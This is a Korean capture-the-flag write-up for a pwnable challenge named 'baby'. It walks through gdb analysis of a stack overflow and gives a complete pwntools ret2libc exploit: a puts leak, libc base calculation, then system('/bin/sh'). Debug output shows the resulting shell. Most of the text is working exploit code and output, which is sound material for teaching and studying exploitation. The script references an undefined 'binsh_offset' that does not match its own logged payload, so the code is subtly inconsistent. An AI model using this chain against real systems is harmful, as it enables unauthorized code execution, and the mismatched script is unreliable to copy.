# baby

## binary

```nasm
gdb-peda$ disass main
Dump of assembler code for function main:
   0x000000000040070e <+0>:	push   rbp
   0x000000000040070f <+1>:	mov    rbp,rsp
   0x0000000000400712 <+4>:	sub    rsp,0x20
   0x0000000000400716 <+8>:	mov    eax,0x0
   0x000000000040071b <+13>:	call   0x4006d5 <init>
   0x0000000000400720 <+18>:	mov    edi,0x4007f0
   0x0000000000400725 <+23>:	call   0x400550 <puts@plt>
   0x000000000040072a <+28>:	mov    edi,0x400824
   0x000000000040072f <+33>:	mov    eax,0x0
   0x0000000000400734 <+38>:	call   0x400580 <printf@plt>
   0x0000000000400739 <+43>:	lea    rax,[rbp-0x20]
   0x000000000040073d <+47>:	mov    edx,0x64
   0x0000000000400742 <+52>:	mov    rsi,rax
   0x0000000000400745 <+55>:	mov    edi,0x0
   0x000000000040074a <+60>:	mov    eax,0x0
   0x000000000040074f <+65>:	call   0x400590 <read@plt>
   0x0000000000400754 <+70>:	mov    eax,0x0
   0x0000000000400759 <+75>:	leave  
   0x000000000040075a <+76>:	ret    
End of assembler dump.
gdb-peda$ 
```

`puts@plt`를 이용해 `puts`의 주소를 leak한 후 offset을 이용해 `libc`의 주소를 알아내 `system`함수를 호출하자.

먼저 필요한 것은 `put_plt`, `puts_got`, `main`, `system_offset`, `puts_offset`, `"/bin/sh"`, `pop_rdi` 이다.

`main = 0x040070e`

```bash
gdb-peda$ disass 0x400550
Dump of assembler code for function puts@plt:
   0x0000000000400550 <+0>:	jmp    QWORD PTR [rip+0x200ac2]        # 0x601018
   0x0000000000400556 <+6>:	push   0x0
   0x000000000040055b <+11>:	jmp    0x400540
End of assembler dump.
gdb-peda$ x/wx 0x601018
0x601018:	0x00400556
gdb-peda$ 
```
`puts_plt = 0x400550`, `puts_got = 0x601018`

```bash
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x7ffff7a52390 <__libc_system>
gdb-peda$ shell ps
   PID TTY          TIME CMD
 60089 pts/21   00:00:24 zsh
 66572 pts/21   00:00:00 gdb
 66581 pts/21   00:00:00 baby
 66585 pts/21   00:00:00 ps
gdb-peda$ shell cat /proc/66581/maps
00400000-00401000 r-xp 00000000 08:01 1719302                            /home/ubuntu/Desktop/IGRUS/CTF_T34M/INSA/Pwnable/porb/tmp/baby/baby
00600000-00601000 r--p 00000000 08:01 1719302                            /home/ubuntu/Desktop/IGRUS/CTF_T34M/INSA/Pwnable/porb/tmp/baby/baby
00601000-00602000 rw-p 00001000 08:01 1719302                            /home/ubuntu/Desktop/IGRUS/CTF_T34M/INSA/Pwnable/porb/tmp/baby/baby
7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 921381                     /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 921381                     /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 921381                     /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 921381                     /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 
7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 921353                     /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7fdb000-7ffff7fde000 rw-p 00000000 00:00 0 
7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 921353                     /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 921353                     /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
gdb-peda$ p 0x7ffff7a52390 - 0x7ffff7a0d000
$2 = 0x45390
gdb-peda$ p puts
$3 = {<text variable, no debug info>} 0x7ffff7a7c690 <_IO_puts>
gdb-peda$ p 0x7ffff7a7c690 - 0x7ffff7a0d000
$4 = 0x6f690
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
baby : 0x4007e8 --> 0x68732f6e69622f ('/bin/sh')
baby : 0x6007e8 --> 0x68732f6e69622f ('/bin/sh')
libc : 0x7ffff7b99d57 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x004007c3 : (b'5fc3')	pop rdi; ret
gdb-peda$
```

`system_offset = 0x45390`, `puts_offset = 0x6f690`, `binsh = 0x4007e8`, `pop_rdi = 0x004007c3`

이로 구성한 첫번째 ROP 코드와 스택 프레임은 다음과 같다.

```c
puts(puts_got)
goto main
```

Stack | Explanation
----|----
pop rdi | ret of main
puts got | Argv1
puts plt | ret of gadget
main | ret of puts

이 코드가 실행되면 `puts_got`의 값이 출력되고 `main`으로 돌아오게 된다.

그 후 출력된 값을 이용해 `libc`의 실제 주소를 구한 후 아래와 같은 코드를 실행하게 한다.

```c
system("/bin/sh")
```

Stack | Explanation
---- | ----
pop rdi | ret of main
bin sh | Argv1
libc + system() offset | ret of gadget

# exploit.py

```python
from pwn import *

context.log_level = 'debug'

puts_plt = 0x400550
puts_got = 0x601018
puts_offset = 0x6f690

system_offset = 0x45390

main = 0x40070e
binsh = 0x4007e8

pop_rdi = 0x004007c3

payload = 'a'*0x28

payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

with open('./payload', 'w') as fp:
    fp.write(payload)

p = process('./baby')

p.sendline(payload)
p.recvuntil('you > ')

leak = p.recv(6)
print hexdump(leak)

leak = u64(leak + '\x00\x00')
print 'leaked: ' + str(hex(leak))

libc = leak - puts_offset
print 'libc: ' + str(hex(libc))

#gdb.attach(proc.pidof(p)[0])

payload = 'a'*0x28
payload += p64(pop_rdi) + p64(binsh_offset + libc) + p64(libc + system_offset)

p.recvuntil('you >')
p.sendline(payload)

p.interactive()
```

```bash
[+] Starting local process './baby': pid 66679
[DEBUG] Sent 0x49 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  c3 07 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
    00000030  18 10 60 00  00 00 00 00  50 05 40 00  00 00 00 00  │··`·│····│P·@·│····│
    00000040  0e 07 40 00  00 00 00 00  0a                        │··@·│····│·│
    00000049
[DEBUG] Received 0x7b bytes:
    00000000  62 61 62 79  20 3a 20 4e  6f 74 68 69  6e 67 20 74  │baby│ : N│othi│ng t│
    00000010  6f 20 74 65  6c 6c 20 75  2c 20 4a 75  73 74 20 70  │o te│ll u│, Ju│st p│
    00000020  72 6f 76 65  20 75 20 61  72 65 20 6e  6f 74 20 62  │rove│ u a│re n│ot b│
    00000030  61 62 79 0a  79 6f 75 20  3e 20 90 86  bf 55 ec 7f  │aby·│you │> ··│·U··│
    00000040  0a 62 61 62  79 20 3a 20  4e 6f 74 68  69 6e 67 20  │·bab│y : │Noth│ing │
    00000050  74 6f 20 74  65 6c 6c 20  75 2c 20 4a  75 73 74 20  │to t│ell │u, J│ust │
    00000060  70 72 6f 76  65 20 75 20  61 72 65 20  6e 6f 74 20  │prov│e u │are │not │
    00000070  62 61 62 79  0a 79 6f 75  20 3e 20                  │baby│·you│ > │
    0000007b
00000000  90 86 bf 55  ec 7f                                  │···U│··│
00000006
leaked: 0x7fec55bf8690
libc: 0x7fec55b89000
[DEBUG] Sent 0x41 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  c3 07 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
    00000030  57 5d d1 55  ec 7f 00 00  90 e3 bc 55  ec 7f 00 00  │W]·U│····│···U│····│
    00000040  0a                                                  │·│
    00000041
[*] Switching to interactive mode
 $ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x81 bytes:
    'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n'
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ 
```